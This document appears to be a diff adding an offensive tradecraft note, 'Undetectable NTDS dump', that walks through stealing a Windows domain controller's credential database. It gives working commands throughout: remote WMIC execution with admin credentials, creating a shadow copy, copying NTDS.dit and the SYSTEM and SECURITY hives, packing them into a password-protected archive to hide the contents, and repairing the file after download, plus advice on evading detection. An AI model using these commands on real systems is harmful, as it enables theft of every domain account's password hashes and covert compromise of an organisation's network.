@@ -1,0 +1,33 @@
+Undetectable NTDS dump
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"
+
+
+Creating request for shadow copies listing. There are dates available so check the latest or manually create a new one:
+
+net start Volume Shadow Copy
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+
+
+Find the most recent shadow copy
+
+Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+We'll need the copy number for the next command correspondingly
+
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"
+
+
+There should be files ntds.dit / security / system created in c:\temp\log\
+Using portable version of 7z create password-protected archive:
+
+Code: [Select]
+
+7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+
+
+Download password-protected archive. Upon getting NTDS decryption error (corrupted file) try this command:
+
+Esentutl /p C:\log\ntds.dit
+
+The trick is there is no NTDS dump itself only password-protected archive. 
+In case you're detected try this method. The only possible detection is the traffic analysis from DC but without password there is no way to understand what exactly being extracted.
